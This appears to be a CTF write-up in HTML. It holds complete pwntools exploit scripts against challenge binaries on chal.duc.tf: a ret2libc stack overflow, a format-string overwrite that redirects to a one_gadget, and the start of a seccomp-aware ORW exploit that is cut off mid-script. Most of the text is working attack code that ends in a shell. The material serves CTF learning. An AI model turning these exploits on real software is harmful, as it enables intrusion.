<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where would you like to return to?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This vuln is a common stack overflow vuln, but no backdoor function we can use. we should leak libc base address before program end, then use ret2libc methond to call system function to get shell.</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./return-to-what&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30003</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	pop_rdi = <span class="number">0x040122b</span></span><br><span class="line">	ret = <span class="number">0x0401016</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(<span class="number">0x4011AD</span>)</span><br><span class="line">	db()</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	libc_base = leak - <span class="number">0x0809c0</span></span><br><span class="line">	li(<span class="string">&#x27;lib_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">	sh_str = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(ret)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(sh_str)</span><br><span class="line">	p += p64(system)</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>







<h2 id="3-echos"><a href="#3-echos" class="headerlink" title="3 [echos]"></a>3 [echos]</h2><p>This program is a echo server, to print what you input. It’s easy to find a vulnerability in this program.It is format vul. we need use this vulnerability to leak main function return address in stack and leak libc base address.  Use libc database to search libc version by countent of leak then to download it. a one_gadget tool is very useful tool for searching one gadget in libc.  In order to get shell we should modify main ret address in stack as one gadget</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./echos.bk&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	offset = <span class="number">8</span></span><br><span class="line">	p = <span class="string">&#x27;%11$p,%27$p,%19$p&#x27;</span></span><br><span class="line"></span><br><span class="line">	sl(p)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	elf_base = leak - (<span class="number">0x563d9cb8e8dd</span> - <span class="number">0x563d9cb8e000</span>)</span><br><span class="line">	li(<span class="string">&#x27;elf_base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak stack base</span></span><br><span class="line">	ru(<span class="string">&#x27;,0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;stack_leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	main_ret = leak - (<span class="number">0x7ffc1f9e87e0</span> - <span class="number">0x7ffc1f9e8708</span>)</span><br><span class="line">	li(<span class="string">&#x27;main_ret: &#x27;</span> + <span class="built_in">hex</span>(main_ret))</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;,0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;main_init_leak: &#x27;</span> + <span class="built_in">hex</span>(leak - <span class="number">231</span>))</span><br><span class="line">	db()</span><br><span class="line">	libc_base = leak - (<span class="number">0x7f7d13204b97</span> - <span class="number">0x7f7d131e3000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;A&#x27;</span> * <span class="number">4</span></span><br><span class="line">	p += p64(main_ret + <span class="number">2</span>) <span class="comment">#0xF0000</span></span><br><span class="line">	li(<span class="string">&#x27;one_gadget: &#x27;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xFFFF</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;A&#x27;</span> * <span class="number">3</span></span><br><span class="line">	p += p64(main_ret + <span class="number">0</span>) <span class="comment">#0xF0000</span></span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="4-return-to-whats-revenge"><a href="#4-return-to-whats-revenge" class="headerlink" title="4 [return-to-whats-revenge]"></a>4 [return-to-whats-revenge]</h2><p>Same as before, there is a stack overflow  vulnerability in this program. but this program has a protection in sandbox function.  It is a seccomp rule to forbid some syscall. The sandbox function content as follows:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filter[24].code &#x3D; 6;</span><br><span class="line">filter[24].jt &#x3D; 0;</span><br><span class="line">filter[24].jf &#x3D; 0;</span><br><span class="line">filter[0x18].k &#x3D; 0;</span><br><span class="line">bpf_resolve_jumps(&amp;lab, filter, 0x19uLL);</span><br><span class="line">prog.len &#x3D; 0x19;</span><br><span class="line">prog.filter &#x3D; filter;</span><br><span class="line">prctl(0x26, 1LL, 0LL, 0LL, 0LL, *(_QWORD *)&amp;prog.len, filter);&#x2F;&#x2F; PR_SET_NO_NEW_PRIVS, no execve</span><br><span class="line">prctl(0x16, 2LL, &amp;prog);</span><br></pre></td></tr></table></figure>

<p>but this program I can’t use seccomp tool to dump the rule. so it has a bad syscall  when I use orw method to exploit this program, this rule cannot use open function to open file, must use syscall with specific value in regisger to realize open function, or it will call open syscall failed! That’s a place easily to make a mistake. </p>
<p>​    you must create a open function syscall by yourself, or while calling open function in libc will be a bad syscall.</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./return-to-whats-revenge.bk&#x27;</span></span><br><span class="line"></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; 